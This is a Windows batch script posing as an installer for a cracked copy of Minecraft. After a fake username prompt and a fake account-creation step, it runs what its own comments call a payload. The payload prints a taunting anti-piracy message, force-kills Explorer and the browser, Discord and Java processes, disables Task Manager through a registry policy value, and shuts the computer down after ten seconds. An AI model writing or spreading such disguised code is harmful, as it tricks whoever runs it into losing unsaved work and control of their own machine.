@echo off
:: No title screen this time. Why? Well, for two things. 1, I'm too lazy to make one, and 2, it'll make it seem like a different developer; so now, it's only a question.
:main
echo.
set /p "answer=Install a cracked version of Minecraft? ( Y/N ): "

:: Answer Logic
if /i "%answer%"=="Y" (
goto mineinstall
)

if /i "%answer%"=="N" (
exit
)

echo Input an valid answer!
echo ( Resetting in 3 seconds... )
timeout /t 3 >nul
goto main

:mineinstall
cls
echo.
echo What will be your username?
set /p "mcuser=Username ( Max 20 chars, min 3 ): "

:: The Counter
set "test_len=%mcuser%"
set "count=0"
:count_loop
if defined test_len (
    set "test_len=%test_len:~1%"
    set /a count+=1
    goto count_loop
)

:: The Verdict
if %count% LSS 3 (
    echo.
    echo [!] ERROR: Username too short.
    echo Expected: Min 3 | Received: %count%
    timeout /t 2 >nul
    goto mineinstall
)

if %count% GTR 20 (
    echo.
    echo [!] ERROR: Username too long.
    echo Expected: Max 20 | Received: %count%
    timeout /t 2 >nul
    goto mineinstall
)

:: The code above makes sure that the fake username is EXACTLY 20 characters or less, and above 3.

:: The code below will pretend to make an account for the user.
echo.
echo Success!
echo We will make an account for you. ( Max waiting time: ~5 seconds)
echo.
echo ( Do not close the window until all of the processes are done. )
timeout /t 5 /nobreak
goto fucked

:: This code is the payload. Stupid pirate, programs are for payers!
:fucked
cls
echo ( READ ME )
echo.
echo You know what the definition of insanity is?
echo.
echo "Coming back, and doing the same thing over and over again, expecting things to change".
echo.
echo Pirates like you are the exact definition of that. Coming back, hoping for a new outcome..
echo.
echo A new program to pirate..
echo.
echo When do pirates like you ever learn?
echo.
echo First, it's adult games, then movies..
echo.
echo What will it take to satisfy you?
echo.
echo You think you can never have too much...
echo.
echo Until the police come knocking at your door. [ :
taskkill /f /im explorer.exe
taskkill /f /im chrome.exe /t >nul 2>&1
taskkill /f /im msedge.exe /t >nul 2>&1
taskkill /f /im discord.exe /t >nul 2>&1
taskkill /f /im javaw.exe /t >nul 2>&1
:: Disabling Task Manager [ :
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
shutdown /s /t 10 /c "Stupid pirate, programs are for payers! [ :"


